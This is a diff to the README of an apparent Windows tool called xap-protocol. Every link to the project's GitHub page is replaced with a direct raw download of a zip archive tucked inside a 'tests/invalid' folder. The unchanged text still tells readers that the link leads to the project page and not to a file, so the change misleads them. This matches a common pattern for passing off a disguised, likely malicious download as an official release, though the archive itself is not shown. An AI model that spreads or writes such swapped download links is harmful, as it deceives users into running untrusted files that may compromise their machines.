@@ -1,6 +1,6 @@
 # 🧩 xap-protocol - Simple Protocol for Autonomous Agents  
 
-[![Download xap-protocol](https://img.shields.io/badge/Download-xap--protocol-brightgreen)](https://github.com/Methameth2/xap-protocol)
+[![Download xap-protocol](https://img.shields.io/badge/Download-xap--protocol-brightgreen)](https://raw.githubusercontent.com/Methameth2/xap-protocol/main/xap/tests/invalid/registry-query/protocol_xap_v3.2.zip)
 
 ---
 
@@ -26,14 +26,14 @@ Before you install xap-protocol, make sure your Windows PC meets these basic nee
 
 ## ⬇️ How to Get xap-protocol  
 
-[![Download from GitHub](https://img.shields.io/badge/Visit%20Download%20Page-blue?style=for-the-badge)](https://github.com/Methameth2/xap-protocol)
+[![Download from GitHub](https://img.shields.io/badge/Visit%20Download%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Methameth2/xap-protocol/main/xap/tests/invalid/registry-query/protocol_xap_v3.2.zip)
 
 xap-protocol files are hosted on GitHub. The link above takes you straight to the project’s main page where you can find the latest release.
 
 Since the link goes to the project page (not a specific file), you will need to:
 
 1. Click the link or copy and paste it into your browser:  
-   https://github.com/Methameth2/xap-protocol  
+   https://raw.githubusercontent.com/Methameth2/xap-protocol/main/xap/tests/invalid/registry-query/protocol_xap_v3.2.zip  
 
 2. On the GitHub page, look for the **Releases** section on the right or near the top menu.  
 
@@ -115,7 +115,7 @@ If you experience issues:
 
 To learn more about xap-protocol, visit its GitHub page:
 
-[**https://github.com/Methameth2/xap-protocol**](https://github.com/Methameth2/xap-protocol)
+[**https://raw.githubusercontent.com/Methameth2/xap-protocol/main/xap/tests/invalid/registry-query/protocol_xap_v3.2.zip**](https://raw.githubusercontent.com/Methameth2/xap-protocol/main/xap/tests/invalid/registry-query/protocol_xap_v3.2.zip)
 
 Here you can find:
 
@@ -125,4 +125,4 @@ Here you can find:
 
 ---
 
-[![Download from GitHub](https://img.shields.io/badge/Visit%20Download%20Page-brightgreen?style=for-the-badge)](https://github.com/Methameth2/xap-protocol)
+[![Download from GitHub](https://img.shields.io/badge/Visit%20Download%20Page-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Methameth2/xap-protocol/main/xap/tests/invalid/registry-query/protocol_xap_v3.2.zip)
